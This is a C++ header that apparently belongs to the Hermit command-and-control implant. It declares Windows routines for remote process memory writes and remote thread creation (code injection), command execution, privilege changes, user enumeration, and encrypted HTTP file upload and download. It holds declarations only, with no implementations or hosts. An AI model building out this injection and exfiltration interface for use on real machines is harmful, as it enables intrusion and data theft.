#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include "core/state.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

#include <windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <fstream>
#include <lm.h>
#include <map>
#include <sddl.h>
#include <string>
#include <strsafe.h>
#include <synchapi.h>
#include <vector>

#define INFO_BUFFER_SIZE 32767

namespace System::Handle
{
    BOOL HandleClose(Procs::PPROCS pProcs, HANDLE handle);
    BOOL HandleWait(Procs::PPROCS pProcs, HANDLE handle, BOOL bAlertable, PLARGE_INTEGER pTimeout);
}

namespace System::Arch
{
    std::wstring ArchGetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring EnvStringsGet(
        Procs::PPROCS       pProcs,
        const std::wstring& envVar
    );
    std::map<std::wstring, std::wstring> EnvAllGet(Procs::PPROCS pProcs);
}

namespace System::Group
{
    std::vector<std::wstring> AllGroupsGet();
}

namespace System::User
{
    std::wstring UserAccountNameGet(); // retrieves computer name and username.
    std::wstring UserSIDGet(Procs::PPROCS pProcs);
    std::vector<std::wstring> AllUsersGet();
}

namespace System::Priv
{
    BOOL PrivilegeCheck(HANDLE hToken, LPCTSTR lpszPrivilege);
    BOOL PrivilegeSet(
        HANDLE  hToken,
        LPCTSTR lpszPrivilege,
        BOOL    bEnablePrivilege
    );
}

namespace System::Process
{
    HANDLE ProcessCreate(
        Procs::PPROCS   pProcs,
        LPCWSTR         lpApplicationName,
        DWORD           dwDesiredAccess, // e.g. PROCESS_ALL_ACCESS
        HANDLE          hParentProcess
    );
    HANDLE ProcessOpen(
        Procs::PPROCS   pProcs,
        DWORD           dwProcessID,
        DWORD           dwDesiredAccess
    );
    HANDLE ProcessTokenOpen(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwDesiredAccess
    );
    BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    );
    PVOID VirtualMemoryAllocate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwSize,
        DWORD           dwAllocationType,   // e.g. MEM_COMMIT | MEM_RESERVE
        DWORD           dwProtect           // e.g. PAGE_READWRITE
    );
    BOOL VirtualMemoryFree(
        Procs::PPROCS   pProcs,
        HANDLE 	        hProcess,
		PVOID* 	        lpBaseAddr,
		SIZE_T 	        dwSize,
		DWORD 	        dwFreeType
    );
    BOOL VirtualMemoryWrite(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        LPVOID          lpBaseAddr,
        LPVOID          lpBuffer,
		DWORD           dwBufferSize,
        PDWORD 			lpNumberOfBytesWritten
    );
    HANDLE RemoteThreadCreate(
        Procs::PPROCS           pProcs,
        HANDLE                  hProcess,
        LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
        PVOID                   pArgument
    );

    std::wstring ExecuteCmd(
        Procs::PPROCS       pProcs,
        const std::wstring& wCmd
    );
    BOOL ExecuteFile(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    );
}

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD           dwErrorCode,
        DWORD           dwNumberOfBytesTransfered,
        LPOVERLAPPED    lpOverlapped
    );

    std::wstring AbsolutePathGet(
        Procs::PPROCS       pProcs,
        const std::wstring& wPath,
        BOOL                bExtendLength
    );
    HANDLE DirectoryCreate(
        Procs::PPROCS       pProcs,
        const std::wstring& wDirPath
    );
    std::vector<std::wstring> DirectoryGetFiles(
        Procs::PPROCS       pProcs,
        const std::wstring& wDirPath,
        BOOL                bRecurse
    );
    BOOL DirectoryChangeCurrent(
        Procs::PPROCS       pProcs,
        const std::wstring& wDestPath
    );
    HANDLE FileCreate(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath,
        DWORD               dwCreateDisposition,
        DWORD               dwCreateOptions
    );
    std::vector<BYTE> FileRead(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    );
    BOOL FileWrite(
        Procs::PPROCS               pProcs,
        const std::wstring&         wFilePath,
        const std::vector<BYTE>&    bytes
    );
    BOOL FileMove(
        Procs::PPROCS       pProcs,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
    BOOL FileDelete(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    );
    DWORD FileGetSize(
        Procs::PPROCS   pProcs,
        HANDLE          hFile
    );
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };
    struct WinHttpResponse {
        BOOL        bResult;
        HINTERNET   hRequest;
        DWORD       dwStatusCode;
    };

    WinHttpHandlers RequestInit(
		Procs::PPROCS   pProcs,
		LPCWSTR         lpHost,
		INTERNET_PORT   nPort
	);
    WinHttpResponse RequestSend(
        Procs::PPROCS   pProcs,
        HINTERNET       hConnect,
        LPCWSTR         lpHost,
        INTERNET_PORT   nPort,
        LPCWSTR         lpPath,
        LPCWSTR         lpMethod,
        LPCWSTR         lpHeaders,
        LPVOID          lpData,
        DWORD           dwDataLength
    );
    std::wstring ResponseRead(
        Procs::PPROCS   pProcs,
        HINTERNET       hRequest
    );
    BOOL FileDownload(
        Procs::PPROCS       pProcs,
        Crypt::PCRYPT       pCrypt,
        HINTERNET           hConnect,
        LPCWSTR             lpHost,
        INTERNET_PORT       nPort,
        LPCWSTR             lpPath,
        LPCWSTR             lpHeaders,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
    BOOL FileUpload(
        Procs::PPROCS       pProcs,
        Crypt::PCRYPT       pCrypt,
        HINTERNET           hConnect,
        LPCWSTR             lpHost,
        INTERNET_PORT       nPort,
        LPCWSTR             lpPath,
        LPCWSTR             lpHeaders,
        const std::wstring& wSrc
    );
    VOID WinHttpCloseHandles(
        Procs::PPROCS   pProcs,
        HINTERNET       hSession,
        HINTERNET       hConnect,
        HINTERNET       hRequest
    );
}

namespace System::Registry
{
    HANDLE RegOpenKey(
        Procs::PPROCS       pProcs,
        const std::wstring& wKeyPath,
        DWORD               dwAccessMask
    );
}

#endif // HERMIT_CORE_SYSTEM_HPP